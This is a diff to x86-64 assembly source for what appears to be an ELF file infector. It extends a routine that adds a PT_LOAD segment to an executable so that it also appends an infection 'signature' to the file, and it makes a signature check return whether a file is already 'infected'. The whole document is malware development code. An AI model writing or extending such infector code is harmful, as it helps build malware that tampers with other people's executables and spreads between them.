@@ -234,6 +234,24 @@ add_pt_load:
     lea rsi, [rel elf_phdr_buf]
     syscall
 
+    ; Now append the signature at the end of the file
+    ; Seek to the end of file (where p_offset points)
+    mov eax, SYS_LSEEK
+    mov edi, r13d               ; fd
+    mov rsi, [rbp-8]            ; offset = original file size (end of file)
+    xor edx, edx                ; SEEK_SET = 0
+    syscall
+
+    test rax, rax
+    js .add_pt_load_close_fail
+
+    ; Write the signature at the end of the file
+    mov eax, SYS_WRITE
+    mov edi, r13d               ; fd
+    lea rsi, [rel signature]    ; signature string
+    mov edx, signature_len      ; signature length
+    syscall
+
     ; Close the file
     mov eax, SYS_CLOSE
     mov edi, r13d
@@ -274,6 +292,7 @@ add_pt_load:
 check_signature:
     push rbp
     mov rbp, rsp
+    sub rsp, 8                  ; allocate space for return value
     push r12                    ; saved file path
     push r13                    ; saved file descriptor
     push r14                    ; saved file size / bytes read
@@ -379,6 +398,9 @@ check_signature:
     ; Print "infected file"
     lea rdi, [rel msg_infected]
     call print_string
+    
+    ; Return 1 (infected) - save to stack
+    mov qword [rbp-8], 1
     jmp .check_sig_done
 
 .check_sig_close_not_infected:
@@ -391,6 +413,9 @@ check_signature:
     ; Print "not infected"
     lea rdi, [rel msg_not_infected]
     call print_string
+    
+    ; Return 0 (not infected) - save to stack
+    mov qword [rbp-8], 0
 
 .check_sig_done:
     pop rbx
@@ -398,6 +423,8 @@ check_signature:
     pop r14
     pop r13
     pop r12
+    ; Load return value from stack
+    mov rax, [rbp-8]
     mov rsp, rbp
     pop rbp
     ret
